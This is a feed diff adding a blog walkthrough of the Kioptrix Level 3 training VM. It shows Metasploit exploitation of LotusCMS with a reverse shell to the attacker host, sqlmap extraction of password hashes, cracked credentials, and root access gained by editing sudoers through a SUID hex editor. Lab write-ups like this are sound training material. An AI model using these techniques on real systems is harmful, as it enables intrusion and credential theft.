@@ -4,7 +4,7 @@
   <title><![CDATA[Category: hacking | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/hacking/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2014-06-20T01:33:50+03:00</updated>
+  <updated>2014-06-22T21:37:47+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,319 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 3]]></title>
+    <link href="http://chousensha.github.io/blog/2014/06/20/pentest-lab-kioptrix-level-3/"/>
+    <updated>2014-06-20T23:53:34+03:00</updated>
+    <id>http://chousensha.github.io/blog/2014/06/20/pentest-lab-kioptrix-level-3</id>
+    <content type="html"><![CDATA[<p>Next in the Kioptrix series is level 3.</p>
+
+<p><strong>Important</strong></p>
+
+<p>With the VM there is a README.txt file that says you should update your hosts file with the VM&rsquo;s IP and hostname, which is <em>kioptrix3.com</em>. I initially ignored it and on the gallery page, all I could see were some broken images and links that didn&rsquo;t work. I went back and added the entry to my <code>/etc/hosts</code> file, and everything worked fine afterwards.</p>
+
+<!-- more -->
+
+
+<p>Start by checking out what&rsquo;s being exposed with Nmap:</p>
+
+<p>``` plain
+nmap -A -p1-65535 192.168.127.128</p>
+
+<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-20 23:56 EEST
+Nmap scan report for 192.168.127.128
+Host is up (0.00039s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey:
+|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
+|<em>  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Ligoat Security &ndash; Got Goat? Security &hellip;
+MAC Address: 00:0C:29:07:4F:A9 (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 &ndash; 2.6.33
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```</p>
+
+<p>Let&rsquo;s take a look at what&rsquo;s hosted on the web server. It appears to be a site with a blog page, a gallery and what appears to be an admin login page:</p>
+
+<p><img class="center" src="/images/lotus_cms.png" title="&lsquo;admin login&rsquo; &lsquo;login&rsquo;" ></p>
+
+<p>I tried running a sqlmap scan against it, with no success. Next, I thought maybe there might be something about the LotusCMS that powers up the site. It turns out there&rsquo;s a remote execution exploit available in Metasploit:</p>
+
+<p><strong>LotusCMS 3.0 eval() Remote Command Execution</strong></p>
+
+<blockquote><p>This module exploits a vulnerability found in Lotus CMS 3.0&rsquo;s Router() function. This is done by embedding PHP code in the &lsquo;page&rsquo; parameter,
+which will be passed to a eval call, therefore allowing remote code execution. The module can either automatically pick up a &lsquo;page&rsquo; parameter
+from the default page, or manually specify one in the URI option. To use the automatic method, please supply the URI with just a directory path, > for example: &ldquo;/lcms/&rdquo;. To manually configure one, you may do: &ldquo;/lcms/somepath/index.php?page=index&rdquo;</p></blockquote>
+
+<p>``` plain
+msf > use exploit/multi/http/lcms_php_exec
+msf exploit(lcms_php_exec) > show options</p>
+
+<p>Module options (exploit/multi/http/lcms_php_exec):</p>
+
+<p>   Name     Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   Proxies                   no        Use a proxy chain
+   RHOST                     yes       The target address
+   RPORT    80               yes       The target port
+   URI      /lcms/           yes       URI
+   VHOST                     no        HTTP server virtual host</p>
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   0   Automatic LotusCMS 3.0</p>
+
+<p>msf exploit(lcms_php_exec) > set RHOST 192.168.127.128
+RHOST => 192.168.127.128
+msf exploit(lcms_php_exec) > set payload generic/shell_reverse_tcp
+payload => generic/shell_reverse_tcp
+msf exploit(lcms_php_exec) > set LHOST 192.168.127.159
+LHOST => 192.168.127.159
+msf exploit(lcms_php_exec) > set URI /
+URI => /
+msf exploit(lcms_php_exec) > exploit</p>
+
+<p>[<em>] Started reverse handler on 192.168.127.159:4444
+[</em>] Using found page param: /index.php?page=index
+[<em>] Sending exploit &hellip;
+[</em>] Command shell session 1 opened (192.168.127.159:4444 &ndash;> 192.168.127.128:40623) at 2014-06-22 00:37:23 +0300
+whoami</p>
+
+<p>www-data
+```</p>
+
+<p>So we have a shell. I could not find a local privilege escalation exploit right away, so I instead started exploring the system.</p>
+
+<p><code>plain
+pwd
+/home/www/kioptrix3.com
+ls -l
+total 84
+drwxrwxrwx  2 root root  4096 Apr 15  2011 cache
+drwxrwxrwx  8 root root  4096 Apr 14  2011 core
+drwxrwxrwx  8 root root  4096 Apr 14  2011 data
+-rw-r--r--  1 root root 23126 Jun  5  2009 favicon.ico
+drwxr-xr-x  7 root root  4096 Apr 14  2011 gallery
+-rw-r--r--  1 root root 26430 Jan 21  2007 gnu-lgpl.txt
+-rw-r--r--  1 root root   399 Feb 23  2011 index.php
+drwxrwxrwx 10 root root  4096 Apr 14  2011 modules
+drwxrwxrwx  3 root root  4096 Apr 14  2011 style
+-rw-r--r--  1 root root   243 Aug  5  2010 update.php
+</code></p>
+
+<p>The gallery directory looks interesting, so I looked inside:</p>
+
+<p><code>plain
+cd gallery
+ls -l
+total 156
+drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK
+-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql
+-rw-r--r-- 1 root root   252 Apr 12  2011 g.php
+drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin
+-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php
+-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php
+-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php
+-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php
+-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php
+-rw-r--r-- 1 root root   249 Apr 12  2011 index.php
+-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK
+-rw-r--r-- 1 root root   212 Apr 12  2011 login.php
+-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php
+-rw-r--r-- 1 root root   249 Apr 12  2011 p.php
+drwxrwxrwx 2 root root  4096 Apr 12  2011 photos
+-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php
+-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php
+-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php
+-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html
+-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php
+-rw-r--r-- 1 root root   215 Apr 12  2011 register.php
+drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin
+-rw-r--r-- 1 root root   213 Apr 12  2011 search.php
+-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php
+-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php
+drwxr-xr-x 6 root root  4096 Apr 12  2011 themes
+-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt
+-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php
+</code></p>
+
+<p>So, there&rsquo;s all the source code for the gallery. I checked the files that looked interesting until I came upon a hit on the <code>gconfig.php</code> file, which contains the sort of information we need:</p>
+
+<p>``` plain
+/*</p>
+
+<pre><code>A sample Gallarific configuration file. You should edit
+the installer details below and save this file as gconfig.php
+Do not modify anything else if you don't know what it is.
+</code></pre>
+
+<p>*/</p>
+
+<pre><code>$GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";
+
+$GLOBALS["gallarific_mysql_server"] = "localhost";
+$GLOBALS["gallarific_mysql_database"] = "gallery";
+$GLOBALS["gallarific_mysql_username"] = "root";
+$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
+</code></pre>
+
+<p>```</p>
+
+<p>I tried SSHing to the box with these credentials and also elevating privileges with su, but that would have been too easy. So more digging in the Php source code. The <code>gfunctions.php</code> file contains a plethora of information, among which there are some table and column names. There might be more information in the Php files but I didn&rsquo;t have the patience to go through all of them.</p>
+
+<p>Back at the gallery, we can see some sorting options:</p>
+
+<p><img class="center" src="/images/sort.png" title="&lsquo;sort options&rsquo; &lsquo;sort&rsquo;" ></p>
+
+<p>Changing the sort filter to <em>photo id</em> makes the URL look like this:</p>
+
+<p><code><a href="http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos">http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</a></code></p>
+
+<p>And if I replace the <code>id=1</code> part with <code>id=&lsquo;</code>, the site spits back a SQL error:</p>
+
+<p><em>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;&rsquo; order by parentid,sort,name' at line 1Could not select category</em></p>
+
+<p>Now that I know SQLi is possible, it&rsquo;s time to fire sqlmap again!</p>
+
+<p>``` plain
+sqlmap -u &ldquo;<a href="http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos">http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</a>&rdquo; &mdash;dbms=MySQL &mdash;level=5 &mdash;risk=3 &mdash;dump</p>
+
+<p>Database: gallery
+Table: dev_accounts
+[2 entries]
++&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| id | username   | password                         |
++&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
+| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
++&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>```</p>
+
+<p>It was a bit overkill to dump so much information, but I only show here the important bits. To crack the hashes, I used the <a href="http://www.hashkiller.co.uk/">http://www.hashkiller.co.uk/</a> site:</p>
+
+<p>dreg&rsquo;s password: Mast3r</p>
+
+<p>loneferret&rsquo;s password: starwars</p>
+
+<p>Thankfully, these credentials work for SSH login, so I could get rid of the Metasploit shell which kept throwing EOF errors if I didn&rsquo;t interact with it for a while.</p>
+
+<p>``` plain
+ssh <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#108;&#x6f;&#110;&#101;&#x66;&#101;&#x72;&#114;&#x65;&#116;&#x40;&#107;&#x69;&#111;&#112;&#x74;&#114;&#x69;&#x78;&#51;&#46;&#99;&#111;&#x6d;">&#108;&#x6f;&#x6e;&#x65;&#102;&#101;&#114;&#114;&#101;&#116;&#64;&#x6b;&#105;&#111;&#x70;&#x74;&#114;&#x69;&#x78;&#x33;&#x2e;&#99;&#111;&#x6d;</a>
+The authenticity of host &lsquo;kioptrix3.com (192.168.127.128)&rsquo; can&rsquo;t be established.
+RSA key fingerprint is 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added &lsquo;kioptrix3.com&rsquo; (RSA) to the list of known hosts.
+<a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#108;&#x6f;&#110;&#x65;&#x66;&#x65;&#114;&#x72;&#x65;&#116;&#x40;&#107;&#x69;&#x6f;&#112;&#116;&#x72;&#x69;&#120;&#51;&#46;&#99;&#x6f;&#x6d;">&#x6c;&#111;&#110;&#x65;&#102;&#101;&#x72;&#x72;&#x65;&#x74;&#64;&#107;&#105;&#111;&#x70;&#x74;&#x72;&#105;&#120;&#51;&#46;&#99;&#111;&#x6d;</a>&rsquo;s password:
+Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</p>
+
+<p>The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.</p>
+
+<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.</p>
+
+<p>To access official Ubuntu documentation, please visit:
+<a href="http://help.ubuntu.com/">http://help.ubuntu.com/</a>
+Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
+loneferret@Kioptrix3:~$
+```</p>
+
+<p>In the home directory there&rsquo;s a <code>CompanyPolicy.README</code> file with the following:</p>
+
+<p>``` plain
+ Hello new employee,
+ It is company policy here to use our newly installed software for editing, creating and viewing files.
+ Please use the command &lsquo;sudo ht&rsquo;.
+ Failure to do so will result in you immediate termination.</p>
+
+<p> DG
+ CEO
+```</p>
+
+<p>So, let&rsquo;s see what this ht program is all about:</p>
+
+<p><code>plain
+loneferret@Kioptrix3:~$ whereis ht
+ht: /usr/local/bin/ht
+loneferret@Kioptrix3:~$ ls -l /usr/local/bin/ht
+-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht
+</code></p>
+
+<p>Looks like a SUID binary! And it seems it&rsquo;s a hex editor that we can use to view and edit any file on the system!</p>
+
+<p><img class="center" src="/images/ht.png" title="&lsquo;ht&rsquo; &lsquo;ht&rsquo;" ></p>
+
+<p>Ok, I could crack the root password, but there&rsquo;s an easier way, by modifing the <code>/etc/sudoers</code> file. First, I had to look up some information about the ht editor. You need to use the F (function) keys for this one. With F6, I could change the mode to text, making it look less horrible. The easiest way I found to go about it was to open the <code>/etc/sudoers</code> file again, after selecting the text mode. Then I added <em>/bin/bas</em> to loneferret&rsquo;s entry:</p>
+
+<p><img class="center" src="/images/sudo_bash.png" title="&lsquo;sudo bash&rsquo; &lsquo;sudo bash&rsquo;" ></p>
+
+<p>Now save the file and type <em>sudo bash</em> to get the long waited for root shell. In the /root/ directory there&rsquo;s also a <code>Congrats.txt</code> file:</p>
+
+<p>``` plain
+root@Kioptrix3:/root# cat Congrats.txt
+Good for you for getting here.
+Regardless of the matter (staying within the spirit of the game of course)
+you got here, congratulations are in order. Wasn&rsquo;t that bad now was it.</p>
+
+<p>Went in a different direction with this VM. Exploit based challenges are
+nice. Helps workout that information gathering part, but sometimes we
+need to get our hands dirty in other things as well.
+Again, these VMs are beginner and not intented for everyone.
+Difficulty is relative, keep that in mind.</p>
+
+<p>The object is to learn, do some research and have a little (legal)
+fun in the process.</p>
+
+<p>I hope you enjoyed this third challenge.</p>
+
+<p>Steven McElrea
+aka loneferret
+<a href="http://www.kioptrix.com">http://www.kioptrix.com</a></p>
+
+<p>Credit needs to be given to the creators of the gallery webapp and CMS used
+for the building of the Kioptrix VM3 site.</p>
+
+<p>Main page CMS:
+<a href="http://www.lotuscms.org">http://www.lotuscms.org</a></p>
+
+<p>Gallery application:
+Gallarific 2.1 &ndash; Free Version released October 10, 2009
+<a href="http://www.gallarific.com">http://www.gallarific.com</a>
+Vulnerable version of this application can be downloaded
+from the Exploit-DB website:
+<a href="http://www.exploit-db.com/exploits/15891/">http://www.exploit-db.com/exploits/15891/</a></p>
+
+<p>The HT Editor can be found here:
+<a href="http://hte.sourceforge.net/downloads.html">http://hte.sourceforge.net/downloads.html</a>
+And the vulnerable version on Exploit-DB here:
+<a href="http://www.exploit-db.com/exploits/17083/">http://www.exploit-db.com/exploits/17083/</a></p>
+
+<p>Also, all pictures were taken from Google Images, so being part of the
+public domain I used them.
+```</p>
+
+<p>And this was Kioptrix level 3, with another interesting twist.</p>
+
+<blockquote><p>Today is the tomorrow you worried about yesterday.</p></blockquote>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pentest lab - Kioptrix Level 2]]></title>
